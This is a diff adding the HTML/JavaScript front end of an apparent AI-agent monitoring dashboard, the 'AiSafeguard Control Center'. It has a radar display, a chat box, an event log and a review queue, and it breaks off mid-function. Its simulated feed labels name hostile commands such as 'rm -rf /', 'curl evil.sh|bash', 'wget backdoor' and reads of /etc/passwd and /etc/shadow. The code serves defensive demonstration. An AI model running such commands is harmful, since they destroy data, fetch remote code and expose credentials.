@@ -1,0 +1,636 @@
+<!DOCTYPE html>
+<html lang="zh-TW">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>AiSafeguard — Control Center</title>
+<link href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet"/>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.7.5/socket.io.min.js"></script>
+<style>
+  *{margin:0;padding:0;box-sizing:border-box}
+  body{font-family:'DM Sans',system-ui,sans-serif;background:#edf1f5;color:#2a3a4a;overflow:hidden;height:100vh}
+  @keyframes blipPulse{0%,100%{opacity:1;transform:scale(1)}50%{opacity:.7;transform:scale(1.2)}}
+  @keyframes blipFlash{0%{transform:scale(1)}50%{transform:scale(2.2);box-shadow:0 0 24px currentColor}100%{transform:scale(1)}}
+  @keyframes fadeIn{from{opacity:0;transform:translateY(4px)}to{opacity:1;transform:translateY(0)}}
+  @keyframes netFlash{0%,100%{opacity:.2}50%{opacity:.85}}
+  @keyframes floatUp{0%{opacity:1;transform:translateX(-50%) translateY(0)}100%{opacity:0;transform:translateX(-50%) translateY(-24px)}}
+  @keyframes slideInRight{from{transform:translateX(100%);opacity:0}to{transform:translateX(0);opacity:1}}
+  @keyframes slideDown{from{max-height:0;opacity:0}to{max-height:500px;opacity:1}}
+  @keyframes lobsterBob{0%,100%{transform:translateY(0)}50%{transform:translateY(-3px)}}
+  ::-webkit-scrollbar{width:3px}
+  ::-webkit-scrollbar-track{background:#edf1f5}
+  ::-webkit-scrollbar-thumb{background:#c0cad8;border-radius:4px}
+  button{font-family:inherit;cursor:pointer;transition:all .15s}
+  button:hover{filter:brightness(1.1)}
+  button:active{transform:scale(.97)}
+  .feed-btn{background:transparent;border-radius:6px;padding:5px 14px;font-size:12px;font-weight:600;text-transform:uppercase;font-family:'JetBrains Mono',monospace;letter-spacing:.5px;transition:all .15s}
+  .feed-btn:hover{filter:brightness(1.15)}
+  .stat-card{flex:1;background:#edf1f5;border-radius:10px;padding:12px 6px;text-align:center;transition:all .15s}
+  .stat-card.clickable:hover{border-color:rgba(200,144,32,.3)!important}
+  .source-item{background:#edf1f5;border-radius:8px;padding:7px 10px;display:flex;justify-content:space-between;align-items:center;border:1px solid #d4dbe4;font-size:13px}
+  .badge{padding:2px 7px;border-radius:6px;font-size:11px;font-weight:600;font-family:'JetBrains Mono',monospace;letter-spacing:.3px}
+  .chat-msg{max-width:85%;padding:8px 12px;border-radius:10px;font-size:14px;line-height:1.5}
+  .log-row{display:flex;gap:12px;align-items:center;padding:5px 10px;border-radius:6px;font-size:12px;font-family:'JetBrains Mono',monospace}
+  .pending-card{background:#fff;border-radius:10px;padding:14px 16px;border:1px solid #d4dbe4;animation:fadeIn .2s ease both}
+  .modal-overlay{position:fixed;inset:0;background:rgba(0,0,0,.3);backdrop-filter:blur(4px);display:flex;align-items:center;justify-content:center;z-index:100;animation:fadeIn .15s}
+  .modal-box{background:#fff;border:1px solid #d4dbe4;border-radius:16px;padding:32px 40px;width:420px;box-shadow:0 24px 64px rgba(0,0,0,.18)}
+</style>
+</head>
+<body>
+
+<div id="app" style="height:100vh;display:flex;flex-direction:column;padding:14px;gap:12px">
+
+  <!-- ═══ HEADER ═══ -->
+  <header style="display:flex;align-items:center;justify-content:space-between;padding:10px 18px;background:#f6f8fa;border-radius:12px;border:1px solid #d4dbe4;flex-shrink:0">
+    <div style="display:flex;align-items:center;gap:14px">
+      <img src="/static/images/aisafeguard-logo.png" style="height:28px" alt="AiSafeguard"/>
+      <div style="width:1px;height:28px;background:#d4dbe4"></div>
+      <img src="/static/images/asrock-logo.png" style="height:40px;opacity:.9" alt="ASRock Industrial"/>
+      <div style="font-size:12px;color:#8a96a6;font-weight:500">×</div>
+      <img src="/static/images/exein-logo.png" style="height:18px;opacity:.85;filter:invert(1)" alt="Exein"/>
+      <div style="width:1px;height:28px;background:#d4dbe4"></div>
+      <span style="font-size:12px;color:#8a96a6;letter-spacing:.5px;font-weight:500">CONTROL CENTER</span>
+    </div>
+    <div style="display:flex;align-items:center;gap:16px">
+      <div id="feed-buttons" style="display:flex;gap:6px"></div>
+      <div style="width:1px;height:24px;background:#d4dbe4"></div>
+      <label style="display:flex;align-items:center;gap:6px;cursor:pointer;font-size:12px;color:#5a6a7a">
+        <input type="checkbox" id="autoFeedToggle" checked style="accent-color:#2a6dd6"/> Auto
+      </label>
+      <div style="display:flex;align-items:center;gap:6px">
+        <div style="width:6px;height:6px;border-radius:50%;background:#2a9d5c;animation:blipPulse 2s infinite"></div>
+        <span style="font-size:13px;color:#5a6a7a">System Online</span>
+      </div>
+    </div>
+  </header>
+
+  <!-- ═══ MAIN ═══ -->
+  <div style="flex:1;display:flex;gap:12px;min-height:0">
+
+    <!-- LEFT — Live Monitoring -->
+    <div id="sidePanel" style="width:252px;min-width:200px;flex:1 1 0;background:#f6f8fa;border-radius:14px;border:1px solid #d4dbe4;padding:18px;display:flex;flex-direction:column;gap:18px;flex-shrink:0;overflow-y:auto">
+      <div style="display:flex;align-items:center;gap:8px">
+        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#2a6dd6" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 12h-4l-3 9L9 3l-3 9H2"/></svg>
+        <span style="font-size:15px;font-weight:600;color:#1a2a3a;letter-spacing:.3px">Live Monitoring</span>
+      </div>
+      <!-- Stats -->
+      <div id="statsRow" style="display:flex;gap:8px"></div>
+      <div style="height:1px;background:#d4dbe4"></div>
+      <!-- Source groups -->
+      <div id="sourceGroups"></div>
+    </div>
+
+    <!-- CENTER — Radar -->
+    <div id="radarContainer" style="flex:0 0 auto;display:flex;align-items:center;justify-content:center;background:#f6f8fa;border-radius:14px;border:1px solid #d4dbe4;position:relative;overflow:hidden">
+      <div id="netFlashOuter" style="display:none;position:absolute;inset:0;border-radius:14px;border:2px solid #d43838;animation:netFlash .4s ease 2;pointer-events:none;z-index:20;box-shadow:inset 0 0 50px rgba(212,56,56,.08)"></div>
+      <div id="netFlashInner" style="display:none;position:absolute;inset:18%;border-radius:50%;border:2px solid #c89020;animation:netFlash .4s ease 2;pointer-events:none;z-index:20;box-shadow:inset 0 0 30px rgba(200,144,32,.06)"></div>
+      <div id="radarWrap" style="position:relative;border-radius:50%;overflow:hidden;flex-shrink:0">
+        <canvas id="radarCanvas" style="position:absolute;top:0;left:0"></canvas>
+        <div id="blipLayer" style="position:absolute;top:0;left:0;width:100%;height:100%"></div>
+        <!-- Open Claw -->
+        <div id="lobster" style="position:absolute;z-index:10;pointer-events:none">
+          <div id="lobsterShadow" style="position:absolute;bottom:-10%;left:18%;width:64%;height:18%;background:radial-gradient(ellipse,rgba(0,0,0,.3) 0%,transparent 70%);border-radius:50%;filter:blur(2px)"></div>
+          <img src="/static/images/openclaw.png" id="lobsterImg" style="width:100%;height:100%;filter:drop-shadow(2px 4px 6px rgba(0,0,0,.45));transition:transform .2s,filter .2s"/>
+          <div id="lobsterEatLabel" style="display:none;position:absolute;top:-14%;left:50%;transform:translateX(-50%);z-index:20">
+            <div style="font-size:12px;color:#2a9d5c;font-weight:600;font-family:'JetBrains Mono',monospace;animation:floatUp .8s ease-out forwards;white-space:nowrap;text-shadow:0 1px 4px rgba(0,0,0,.6)">PROCESSED</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- RIGHT — User Prompt Chat -->
+    <div style="width:252px;min-width:200px;flex:1 1 0;background:#f6f8fa;border-radius:14px;border:1px solid #d4dbe4;padding:18px;display:flex;flex-direction:column;flex-shrink:0;overflow:hidden">
+      <div style="display:flex;align-items:center;gap:8px;margin-bottom:14px">
+        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#2a6dd6" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M13 2L3 14h9l-1 10 10-12h-9l1-10z"/></svg>
+        <span style="font-size:15px;font-weight:600;color:#1a2a3a;letter-spacing:.3px">User Prompt</span>
+      </div>
+      <div id="chatMessages" style="flex:1;overflow-y:auto;display:flex;flex-direction:column;gap:8px;margin-bottom:12px;min-height:0">
+        <div id="chatPlaceholder" style="color:#8a96a6;font-size:13px;text-align:center;padding:24px">
+          Send a command to Open Claw...
+        </div>
+      </div>
+      <div style="display:flex;gap:8px;align-items:flex-end">
+        <textarea id="promptInput" placeholder="Type a command..." rows="1"
+          style="flex:1;background:#edf1f5;border:1px solid #d4dbe4;border-radius:8px;padding:9px 12px;color:#2a3a4a;font-size:14px;font-family:'JetBrains Mono',monospace;resize:none;outline:none;max-height:60px"></textarea>
+        <button id="sendBtn" onclick="sendPrompt()" style="background:#2a6dd6;border:none;color:#fff;border-radius:8px;padding:9px 14px;font-size:14px;font-weight:600;font-family:'DM Sans',sans-serif;opacity:.4;flex-shrink:0">↵</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- ═══ BOTTOM EVENT LOG ═══ -->
+  <div style="background:#f6f8fa;border-radius:12px;border:1px solid #d4dbe4;padding:12px 18px;flex-shrink:0">
+    <div style="font-size:14px;font-weight:600;color:#1a2a3a;margin-bottom:8px;display:flex;align-items:center;gap:8px;letter-spacing:.3px">
+      <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="#2a6dd6" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2a10 10 0 100 20 10 10 0 000-20zM12 6v6l4 2"/></svg>
+      Event Log
+    </div>
+    <div id="eventLog" style="display:flex;flex-direction:column;gap:3px;max-height:120px;overflow-y:auto">
+      <div style="color:#8a96a6;font-size:13px;text-align:center;padding:12px">Awaiting events...</div>
+    </div>
+  </div>
+</div>
+
+<!-- ═══ REVIEW MODAL (hidden) ═══ -->
+<div id="reviewModal" style="display:none"></div>
+
+<!-- ═══ PENDING PANEL (hidden) ═══ -->
+<div id="pendingPanel" style="display:none;position:fixed;top:0;right:0;bottom:0;width:380px;background:#f6f8fa;border-left:1px solid #d4dbe4;z-index:90;flex-direction:column;animation:slideInRight .2s ease-out;box-shadow:-8px 0 32px rgba(0,0,0,.15)"></div>
+
+<script>
+/* ═══════════════════════════════════════════════════════════════
+   AiSafeguard Control Center — Frontend Logic
+   ═══════════════════════════════════════════════════════════════ */
+
+const T = {
+  blocked:'#d43838', honeypot:'#b87a10', watch:'#c89020',
+  trusted:'#2a9d5c', normal:'#2a6dd6',
+  bg0:'#edf1f5', bg1:'#f6f8fa', bg2:'#ffffff',
+  border:'#d4dbe4', text:'#2a3a4a', textSub:'#5a6a7a',
+  textMuted:'#8a96a6', textBright:'#1a2a3a',
+  accent:'#2a6dd6', sweep:'#2a6dd6',
+  ring1:'#d43838', ring2:'#c89020', ring3:'#2a9d5c',
+  mono:"'JetBrains Mono','SF Mono',monospace",
+  sans:"'DM Sans',system-ui,sans-serif",
+};
+
+const FEED_TYPES = ['blocked','honeypot','watch','trusted','normal'];
+const FEED_LABELS = {
+  blocked:['rm -rf /','DROP TABLE *','curl evil.sh|bash','chmod 777 /etc'],
+  honeypot:['scan_ports','read /etc/passwd','wget backdoor','eval(user_input)'],
+  watch:['subprocess.run()','open("/etc/shadow")','requests.post(ext)','os.system(cmd)'],
+  trusted:['read_config','log_output','return_result','save_report'],
+  normal:['parse_input','format_text','calculate','list_files'],
+};
+const SOURCES_INT = ['Code Execution','File Access','Network Request','System Call'];
+const SOURCES_EXT = ['User Prompt','MCP Tool Call','Plugin Request','Third-party Agent'];
+const rand = a => a[Math.floor(Math.random()*a.length)];
+const timeStr = () => {const d=new Date();return `${String(d.getHours()).padStart(2,'0')}:${String(d.getMinutes()).padStart(2,'0')}:${String(d.getSeconds()).padStart(2,'0')}`};
+
+// ─── State ───
+let stats = {passed:0, blocked:0, reviewing:0};
+let events = [];
+let pendingQueue = [];
+let chatMessages = [];
+let blips = [];
+let autoFeed = true;
+let autoFeedTimer = null;
+let radarSize = 0;
+let sweepAngle = 0;
+let lobsterPos = {x:0, y:0};
+let lobsterTarget = {x:0, y:0};
+let eatingTimeout = null;
+
+// ─── SocketIO Connection ───
+const socket = io();
+
+socket.on('connect', () => console.log('[SocketIO] Connected'));
+
+socket.on('init_state', (data) => {
+  stats = data.stats || stats;
+  events = data.events || [];
+  pendingQueue = data.pending || [];
+  chatMessages = data.chat || [];
+  renderStats();
+  renderEvents();
+  renderChat();
+});
+
+socket.on('new_blip', (item) => addBlip(item));
+socket.on('stats_update', (s) => { stats = s; renderStats(); });
+socket.on('new_event', (ev) => { events.unshift(ev); events = events.slice(0,50); renderEvents(); });
+socket.on('net_flash', (data) => flashNet(data.zone));
+socket.on('eating_task', () => doEat());
+socket.on('pending_update', (data) => { pendingQueue = data.queue; renderStats(); renderPendingPanel(); });
+socket.on('chat_message', (msg) => { chatMessages.push(msg); renderChat(); });
+socket.on('review_complete', (data) => { renderPendingPanel(); });
+
+// ─── Sizing ───
+function computeSize() {
+  radarSize = Math.min(window.innerHeight - 140, window.innerWidth - 560, 520);
+  radarSize = Math.max(radarSize, 280);
+  const wrap = document.getElementById('radarWrap');
+  const cont = document.getElementById('radarContainer');
+  const canvas = document.getElementById('radarCanvas');
+  wrap.style.width = wrap.style.height = radarSize + 'px';
+  cont.style.width = (radarSize + 40) + 'px';
+  canvas.style.width = canvas.style.height = radarSize + 'px';
+  // Lobster size
+  const lobSize = radarSize * 0.14;
+  const lob = document.getElementById('lobster');
+  lob.style.width = lob.style.height = lobSize + 'px';
+  // HiDPI canvas
+  const dpr = window.devicePixelRatio || 1;
+  canvas.width = radarSize * dpr;
+  canvas.height = radarSize * dpr;
+}
+
+// ─── Radar Drawing ───
+function drawRadar() {
+  const canvas = document.getElementById('radarCanvas');
+  const ctx = canvas.getContext('2d');
+  const dpr = window.devicePixelRatio || 1;
+  const s = radarSize;
+  ctx.setTransform(dpr, 0, 0, dpr, 0, 0);
+  ctx.clearRect(0, 0, s, s);
+  const cx = s/2, cy = s/2;
+
+  // Background gradient
+  const bg = ctx.createRadialGradient(cx,cy,0,cx,cy,s/2);
+  bg.addColorStop(0,'#dce4ee'); bg.addColorStop(1,'#c8d4e2');
+  ctx.fillStyle = bg; ctx.beginPath(); ctx.arc(cx,cy,s/2,0,Math.PI*2); ctx.fill();
+
+  // Grid
+  ctx.strokeStyle='#00000008'; ctx.lineWidth=.5;
+  for(let i=-s/2;i<s/2;i+=28){
+    ctx.beginPath();ctx.moveTo(cx+i,0);ctx.lineTo(cx+i,s);ctx.stroke();
+    ctx.beginPath();ctx.moveTo(0,cy+i);ctx.lineTo(s,cy+i);ctx.stroke();
+  }
+
+  // Defense rings
+  [[.84,T.ring1,'INTERCEPT'],[.6,T.ring2,'REVIEW'],[.36,T.ring3,'SAFE']].forEach(([r,color,label])=>{
+    ctx.beginPath();ctx.arc(cx,cy,s/2*r,0,Math.PI*2);ctx.strokeStyle=color+'88';ctx.lineWidth=5;ctx.stroke();
+    ctx.beginPath();ctx.arc(cx,cy,s/2*r,0,Math.PI*2);ctx.strokeStyle=color+'30';ctx.lineWidth=12;ctx.stroke();
+    for(let a=0;a<Math.PI*2;a+=Math.PI/16){
+      const ri=s/2*r-8,ro=s/2*r+8;
+      ctx.beginPath();ctx.moveTo(cx+Math.cos(a)*ri,cy+Math.sin(a)*ri);
+      ctx.lineTo(cx+Math.cos(a)*ro,cy+Math.sin(a)*ro);ctx.strokeStyle=color+'20';ctx.lineWidth=1;ctx.stroke();
+    }
+  });
+
+  // Crosshairs
+  ctx.strokeStyle='#00000010';ctx.lineWidth=1;ctx.setLineDash([6,6]);
+  ctx.beginPath();ctx.moveTo(cx,cy-s*.42);ctx.lineTo(cx,cy+s*.42);ctx.stroke();
+  ctx.beginPath();ctx.moveTo(cx-s*.42,cy);ctx.lineTo(cx+s*.42,cy);ctx.stroke();
+  ctx.setLineDash([]);
+
+  // Safe zone floor
+  const safeR=s*.55/2;
+  ctx.save();ctx.beginPath();ctx.arc(cx,cy,safeR+6,0,Math.PI*2);ctx.clip();
+  const fl=ctx.createRadialGradient(cx,cy,0,cx,cy,safeR+6);
+  fl.addColorStop(0,'#f8f4ec');fl.addColorStop(.6,'#f0e8d8');fl.addColorStop(1,'#e4d8c0');
+  ctx.fillStyle=fl;ctx.fillRect(cx-safeR-10,cy-safeR-10,(safeR+10)*2,(safeR+10)*2);
+  ctx.strokeStyle='#d4bb9030';ctx.lineWidth=.5;
+  for(let gx=cx-safeR-10;gx<cx+safeR+10;gx+=12){
+    ctx.beginPath();ctx.moveTo(gx,cy-safeR-10);ctx.lineTo(gx+4,cy+safeR+10);ctx.stroke();
+  }
+  ctx.restore();
+
+  // Sweep
+  sweepAngle += 1.5 * 0.015;
+  const a = sweepAngle;
+  ctx.save();ctx.globalAlpha=.1;ctx.fillStyle=T.sweep;
+  ctx.beginPath();ctx.moveTo(cx,cy);ctx.arc(cx,cy,s/2*.84,a-.4,a);ctx.closePath();ctx.fill();
+  ctx.globalAlpha=.04;ctx.beginPath();ctx.moveTo(cx,cy);ctx.arc(cx,cy,s/2*.84,a-1.0,a-.4);ctx.closePath();ctx.fill();
+  ctx.restore();
+  ctx.strokeStyle=T.sweep+'99';ctx.lineWidth=1.5;
+  ctx.beginPath();ctx.moveTo(cx,cy);ctx.lineTo(cx+Math.cos(a)*s/2*.84,cy+Math.sin(a)*s/2*.84);ctx.stroke();
+  ctx.fillStyle=T.sweep;ctx.beginPath();ctx.arc(cx+Math.cos(a)*s/2*.84,cy+Math.sin(a)*s/2*.84,2.5,0,Math.PI*2);ctx.fill();
+
+  // Zone labels
+  ctx.font='500 10px DM Sans,sans-serif';ctx.textAlign='center';
+  ctx.fillStyle=T.ring1+'bb';ctx.fillText('INTERCEPT',cx,cy-s*.39);
+  ctx.fillStyle=T.ring2+'99';ctx.fillText('REVIEW',cx,cy-s*.26);
+  ctx.fillStyle=T.ring3+'99';ctx.fillText('SAFE',cx,cy-s*.13);
+
+  requestAnimationFrame(drawRadar);
+}
+
+// ─── Lobster Animation ───
+function animateLobster(){
+  const s = radarSize;
+  const cx = s/2, cy = s/2 + s*0.08;
+  const radius = s*0.04;
+  const size = s*0.14;
+
+  // Move toward target
+  lobsterPos.x += (lobsterTarget.x - lobsterPos.x) * 0.018;
+  lobsterPos.y += (lobsterTarget.y - lobsterPos.y) * 0.018;
+
+  const lob = document.getElementById('lobster');
+  lob.style.left = (cx - size/2 + lobsterPos.x) + 'px';
+  lob.style.top  = (cy - size/2 + lobsterPos.y) + 'px';
+
+  requestAnimationFrame(animateLobster);
+}
+
+function pickLobsterTarget(){
+  const radius = radarSize * 0.04;
+  const angle = Math.random()*Math.PI*2;
+  const dist = Math.random()*radius;
+  lobsterTarget = {x:Math.cos(angle)*dist, y:Math.sin(angle)*dist};
+}
+
+// ─── Blip System ───
+function addBlip(item){
+  const s = radarSize, cx = s/2, cy = s/2;
+  const angle = Math.random()*Math.PI*2;
+  let startX, startY;
+  if(item.source_type==='internal'){
+    const r=s*0.06; startX=cx+Math.cos(angle)*r; startY=cy+Math.sin(angle)*r+s*0.08;
+  } else {
+    const r=s*0.46; startX=cx+Math.cos(angle)*r; startY=cy+Math.sin(angle)*r;
+  }
+
+  const el = document.createElement('div');
+  const color = T[item.type]||T.normal;
+  el.className = 'blip';
+  el.style.cssText = `position:absolute;left:${startX-5}px;top:${startY-5}px;width:10px;height:10px;border-radius:50%;background:${color};box-shadow:0 0 6px ${color}88;animation:blipPulse 2s ease-in-out infinite;z-index:5;transition:box-shadow .3s;`;
+  // Label
+  const lbl = document.createElement('div');
+  lbl.style.cssText = `position:absolute;top:-18px;left:50%;transform:translateX(-50%);font-size:11px;color:${color};font-weight:600;white-space:nowrap;font-family:${T.mono};text-shadow:0 1px 4px ${T.bg0};letter-spacing:.3px`;
+  lbl.textContent = item.label;
+  el.appendChild(lbl);
+
+  document.getElementById('blipLayer').appendChild(el);
+
+  // Calculate destination
+  const outerR=s*.42, innerR=s*.3, safeR=s*.15;
+  const isInt = item.source_type==='internal';
+  let finalR, finalAngle;
+  if(isInt){
+    finalAngle = Math.atan2(startY-cy, startX-cx)||Math.random()*Math.PI*2;
+    if(item.type==='blocked') finalR=innerR+10;
+    else if(item.type==='honeypot'||item.type==='watch') finalR=innerR-5;
+    else finalR=outerR+20;
+  } else {
+    finalAngle = Math.atan2(startY-cy, startX-cx)+0.2;
+    if(item.type==='blocked') finalR=outerR+10;
+    else if(item.type==='honeypot'||item.type==='watch') finalR=innerR+10;
+    else finalR=safeR*0.3;
+  }
+  const targetX=cx+Math.cos(finalAngle)*finalR, targetY=cy+Math.sin(finalAngle)*finalR;
+
+  // Animate
+  let px=startX, py=startY;
+  function move(){
+    const dx=targetX-px, dy=targetY-py, dist=Math.sqrt(dx*dx+dy*dy);
+    if(dist>2){
+      px+=dx*.015; py+=dy*.015;
+      el.style.left=(px-5)+'px'; el.style.top=(py-5)+'px';
+      requestAnimationFrame(move);
+    } else {
+      // Arrived
+      if(item.type==='blocked'){
+        el.style.animation='blipFlash .3s ease-out 2';
+        el.style.boxShadow=`0 0 16px ${color}88`;
+        const blocked = document.createElement('div');
+        blocked.style.cssText=`position:absolute;top:14px;left:50%;transform:translateX(-50%);font-size:10px;color:${T.blocked};font-weight:700;white-space:nowrap;animation:fadeIn .3s;letter-spacing:.5px;font-family:${T.mono}`;
+        blocked.textContent = isInt ? 'NET BLOCKED' : 'INTERCEPTED';
+        el.appendChild(blocked);
+        setTimeout(()=>{el.style.opacity='0';setTimeout(()=>el.remove(),800)},1200);
+      } else if(item.type==='honeypot'||item.type==='watch'){
+        setTimeout(()=>{el.style.opacity='0';setTimeout(()=>el.remove(),800)},2000);
+      } else {
+        setTimeout(()=>{el.style.opacity='0';setTimeout(()=>el.remove(),800)},600);
+      }
+    }
+  }
+  requestAnimationFrame(move);
+}
+
+// ─── Net Flash ───
+function flashNet(zone){
+  const el = document.getElementById(zone==='outer'?'netFlashOuter':'netFlashInner');
+  el.style.display='block';
+  setTimeout(()=>{el.style.display='none'},800);
+}
+
+// ─── Eating Animation ───
+function doEat(){
+  const img = document.getElementById('lobsterImg');
+  const lbl = document.getElementById('lobsterEatLabel');
+  img.style.transform='scale(1.06) translateY(-3px)';
+  img.style.filter='drop-shadow(2px 4px 6px rgba(0,0,0,.45)) brightness(1.15)';
+  lbl.style.display='block';
+  // Re-trigger animation
+  lbl.innerHTML = '<div style="font-size:12px;color:#2a9d5c;font-weight:600;font-family:\'JetBrains Mono\',monospace;animation:floatUp .8s ease-out forwards;white-space:nowrap;text-shadow:0 1px 4px rgba(0,0,0,.6)">PROCESSED</div>';
+  clearTimeout(eatingTimeout);
+  eatingTimeout = setTimeout(()=>{
+    img.style.transform='';
+    img.style.filter='drop-shadow(2px 4px 6px rgba(0,0,0,.45))';
+    lbl.style.display='none';
+  },700);
+}
+
+// ─── Render Functions ───
+function renderStats(){
+  const row = document.getElementById('statsRow');
+  const items = [
+    {label:'Passed',value:stats.passed,color:T.trusted,click:false},
+    {label:'Blocked',value:stats.blocked,color:T.blocked,click:false},
+    {label:'Pending',value:stats.reviewing,color:T.watch,click:true},
+  ];
+  row.innerHTML = items.map((s,i) => `
+    <div class="stat-card ${s.click?'clickable':''}" style="border:1px solid ${s.color}15;cursor:${s.click?'pointer':'default'}"
+      ${s.click?'onclick="openPendingPanel()"':''}>
+      <div style="font-size:20px;font-weight:700;color:${s.color};font-family:${T.mono}">${s.value}</div>
+      <div style="font-size:11px;color:#8a96a6;margin-top:3px;text-transform:uppercase;letter-spacing:.8px">${s.label}</div>
+      ${s.click && s.value>0 ? `<div style="font-size:10px;color:${s.color};margin-top:4px;font-weight:600;letter-spacing:.5px">REVIEW →</div>` : ''}
+    </div>
+  `).join('');
+}
+
+function renderEvents(){
+  const log = document.getElementById('eventLog');
+  if(events.length===0){
+    log.innerHTML='<div style="color:#8a96a6;font-size:13px;text-align:center;padding:12px">Awaiting events...</div>';
+    return;
+  }
+  log.innerHTML = events.slice(0,30).map((ev,i) => {
+    const rc = ev.result==='passed'?T.trusted:ev.result==='blocked'?T.blocked:T.watch;
+    const rl = ev.result==='passed'?'PASSED':ev.result==='blocked'?'BLOCKED':'PENDING';
+    return `<div class="log-row" style="background:${i===0?(T[ev.type]||T.normal)+'06':'transparent'};border-left:2px solid ${T[ev.type]||T.textMuted};${i===0?'animation:fadeIn .3s':''}">
+      <span style="color:#8a96a6;min-width:60px;font-size:11px">${ev.time}</span>
+      <span style="color:${T[ev.type]||T.normal};font-weight:600;min-width:65px;font-size:11px">${(ev.type||'').toUpperCase()}</span>
+      <span style="color:#5a6a7a;flex:1;font-size:11px">${ev.message}</span>
+      <span style="color:${rc};font-weight:600;font-size:11px">${rl}</span>
+    </div>`;
+  }).join('');
+}
+
+function renderChat(){
+  const container = document.getElementById('chatMessages');
+  const placeholder = document.getElementById('chatPlaceholder');
+  if(chatMessages.length===0){
+    if(placeholder) placeholder.style.display='block';
+    return;
+  }
+  if(placeholder) placeholder.style.display='none';
+
+  // Only add new messages
+  while(container.children.length > chatMessages.length){
+    container.removeChild(container.lastChild);
+  }
+
+  // Rebuild all for simplicity
+  container.innerHTML = chatMessages.map((msg,i) => {
+    const isUser = msg.role==='user';
+    const statusColor = msg.status==='blocked'?T.blocked:msg.status==='passed'?T.trusted:T.watch;
+    const statusLabel = msg.status==='blocked'?'⊘ INTERCEPTED':msg.status==='passed'?'✓ EXECUTED':'⚠ PENDING REVIEW';
+    return `<div style="display:flex;flex-direction:column;align-items:${isUser?'flex-end':'flex-start'};animation:fadeIn .2s">
+      <div style="font-size:11px;color:#8a96a6;margin-bottom:3px;text-transform:uppercase;letter-spacing:.5px;font-weight:600">${isUser?'You':'Open Claw'}</div>
+      <div class="chat-msg" style="font-family:${isUser?T.sans:T.mono};background:${isUser?T.accent+'20':T.bg2};border:1px solid ${isUser?T.accent+'33':T.border};color:${isUser?T.text:(msg.status==='blocked'?T.blocked:msg.status==='passed'?T.trusted:T.text)}">
+        ${escHtml(msg.text)}
+        ${msg.status?`<div style="margin-top:4px;font-size:11px;font-weight:600;font-family:${T.mono};color:${statusColor}">${statusLabel}</div>`:''}
+      </div>
+    </div>`;
+  }).join('');
+
+  container.scrollTop = container.scrollHeight;
+}
+
+function escHtml(s){return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;')}
+
+function renderSourceGroups(){
+  const groups = [
+    {name:'Agent Output',icon:'zap',items:[
+      {name:'Code Execution',status:'watch'},{name:'File Access',status:'trusted'},
+      {name:'Network Request',status:'honeypot'},{name:'System Call',status:'blocked'},
+    ]},
+    {name:'Human Input',icon:'server',items:[
+      {name:'User Prompt',status:'trusted'},{name:'MCP Tool Call',status:'watch'},
+      {name:'Plugin Request',status:'honeypot'},{name:'Third-party Agent',status:'blocked'},
+    ]},
+  ];
+  const el = document.getElementById('sourceGroups');
+  el.innerHTML = groups.map((g,gi) => `
+    <div style="margin-bottom:14px">
+      <div style="font-size:12px;color:#8a96a6;margin-bottom:8px;display:flex;align-items:center;gap:6px;text-transform:uppercase;letter-spacing:.8px;font-weight:600">
+        <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="#8a96a6" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+          <path d="${gi===0?'M13 2L3 14h9l-1 10 10-12h-9l1-10z':'M2 2h20v8H2zM2 14h20v8H2zM6 6h.01M6 18h.01'}"/>
+        </svg>
+        ${g.name}
+      </div>
+      <div style="display:flex;flex-direction:column;gap:3px">
+        ${g.items.map(it=>`
+          <div class="source-item">
+            <span style="color:#2a3a4a">${it.name}</span>
+            <span class="badge" style="background:${T[it.status]}15;color:${T[it.status]}">${it.status.toUpperCase()}</span>
+          </div>
+        `).join('')}
+      </div>
+    </div>
+  `).join('');
+}
+
+function renderFeedButtons(){
+  const el = document.getElementById('feed-buttons');
+  el.innerHTML = FEED_TYPES.map(t => `
+    <button class="feed-btn" style="border:1px solid ${T[t]}33;color:${T[t]}"
+      onclick="manualFeed('${t}')">${t}</button>
+  `).join('');
+}
+
+// ─── Pending Panel ───
+function openPendingPanel(){
+  const panel = document.getElementById('pendingPanel');
+  panel.style.display='flex';
+  renderPendingPanel();
+}
+
+function closePendingPanel(){
+  document.getElementById('pendingPanel').style.display='none';
+}
+
+function renderPendingPanel(){
+  const panel = document.getElementById('pendingPanel');
+  if(pendingQueue.length===0 && panel.style.display==='flex'){
+    closePendingPanel(); return;
+  }
+  if(panel.style.display!=='flex') return;
+
+  panel.innerHTML = `
+    <div style="padding:18px 22px;border-bottom:1px solid #d4dbe4;display:flex;align-items:center;justify-content:space-between">
+      <div style="display:flex;align-items:center;gap:10px">
+        <div style="width:28px;height:28px;border-radius:8px;background:${T.watch}18;display:flex;align-items:center;justify-content:center">
+          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="${T.watch}" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M10.29 3.86L1.82 18a2 2 0 001.71 3h16.94a2 2 0 001.71-3L13.71 3.86a2 2 0 00-3.42 0zM12 9v4M12 17h.01"/>
+          </svg>
+        </div>
+        <div>
+          <div style="font-size:16px;font-weight:600;color:#1a2a3a">Pending Review</div>
+          <div style="font-size:12px;color:#8a96a6">${pendingQueue.length} item${pendingQueue.length>1?'s':''} awaiting approval</div>
+        </div>
+      </div>
+      <button onclick="closePendingPanel()" style="background:transparent;border:none;color:#5a6a7a;width:28px;height:28px;display:flex;align-items:center;justify-content:center;border-radius:6px;font-size:16px">&times;</button>
+    </div>
+    <div style="flex:1;overflow-y:auto;padding:12px 16px;display:flex;flex-direction:column;gap:8px">
+      ${pendingQueue.map((item,i) => {
+        const tc = T[item.type]||T.watch;
